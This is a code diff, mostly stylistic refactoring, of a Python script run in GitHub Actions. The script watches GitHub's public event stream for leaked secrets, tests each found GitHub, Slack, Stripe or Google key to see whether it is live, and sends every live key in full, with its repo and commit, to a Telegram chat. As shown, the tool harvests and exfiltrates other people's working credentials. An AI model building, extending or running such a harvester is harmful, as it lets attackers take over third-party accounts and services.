@@ -1,6 +1,14 @@
 #!/usr/bin/env python3
 """GitHub Secret Scanner – GitHub Actions (stateless, single run)"""
-import asyncio, aiohttp, logging, re, math, sys, json, time, os
+import asyncio
+import aiohttp
+import logging
+import re
+import math
+import sys
+import json
+import time
+import os
 from datetime import datetime, timezone
 import requests
 
@@ -15,13 +23,15 @@ LAST_TIMESTAMP_FILE = "last_timestamp.txt"
 # --- Telegram ---
 TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
 TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
+
 def send_telegram(msg):
     if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
         return
     url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
     try:
         requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": msg}, timeout=10)
-    except: pass
+    except Exception as e:
+        logging.error(f"Failed to send Telegram message: {e}")
 
 # --- Patterns ---
 PATTERNS = [
@@ -77,11 +87,13 @@ class GitHub:
     def __init__(self, token):
         self.token = token
         self.session = None
+
     async def _init(self):
         if not self.session:
             self.session = aiohttp.ClientSession(
                 headers={'Authorization': f'token {self.token}', 'Accept': 'application/vnd.github.v3+json'},
                 timeout=aiohttp.ClientTimeout(total=30))
+
     async def fetch_events_since(self, since_iso):
         await self._init()
         url = 'https://api.github.com/events'
@@ -121,7 +133,6 @@ class GitHub:
         if self.session: await self.session.close()
 
 async def verifier_class():
-    # Simple inline verifiers
     sem = asyncio.Semaphore(10)
     s = None
     async def _s():
@@ -163,12 +174,11 @@ async def main():
         logger.error("GITHUB_TOKEN not set")
         return
     gh = GitHub(token)
-    # Read last timestamp
     try:
         with open(LAST_TIMESTAMP_FILE, 'r') as f:
             last_ts = f.read().strip()
-    except:
-        last_ts = datetime.now(timezone.utc).replace(second=0,microsecond=0).isoformat() + 'Z'
+    except FileNotFoundError:
+        last_ts = datetime.now(timezone.utc).replace(second=0, microsecond=0).isoformat() + 'Z'
     since_iso = last_ts
     events = await gh.fetch_events_since(since_iso)
     if not events:
@@ -190,24 +200,29 @@ async def main():
             for f in findings:
                 verifier = f['verifier']
                 valid = None
-                if verifier == 'verify_github': valid = await v_gh(f['token'])
-                elif verifier == 'verify_slack': valid = await v_slack(f['token'])
-                elif verifier == 'verify_stripe': valid = await v_stripe(f['token'])
-                elif verifier == 'verify_google': valid = await v_google(f['token'])
+                if verifier == 'verify_github':
+                    valid = await v_gh(f['token'])
+                elif verifier == 'verify_slack':
+                    valid = await v_slack(f['token'])
+                elif verifier == 'verify_stripe':
+                    valid = await v_stripe(f['token'])
+                elif verifier == 'verify_google':
+                    valid = await v_google(f['token'])
                 if valid is True:
                     alert = f"[LIVE KEY] {f['service']}: {f['token']} (repo: {repo}, commit: {sha})"
                     logger.warning(alert)
-                    with open(LOG_FILE, 'a') as lf: lf.write(json.dumps(f)+'\n')
+                    with open(LOG_FILE, 'a') as lf:
+                        lf.write(json.dumps(f) + '\n')
                     send_telegram(alert)
                 elif valid is False:
                     logger.info(f"[DEAD] {f['service']}: {f['token']}")
                 else:
                     logger.info(f"[UNKNOWN] {f['service']}: {f['token']}")
-    # Update timestamp to now
-    new_ts = datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')
-    with open(LAST_TIMESTAMP_FILE, 'w') as f:
-        f.write(new_ts)
-    logger.info(f"Run complete, updated timestamp to {new_ts}")
+    if found_any:
+        new_ts = datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')
+        with open(LAST_TIMESTAMP_FILE, 'w') as f:
+            f.write(new_ts)
+        logger.info(f"Run complete, updated timestamp to {new_ts}")
     if ver_sess: await ver_sess.close()
     await gh.close()
 
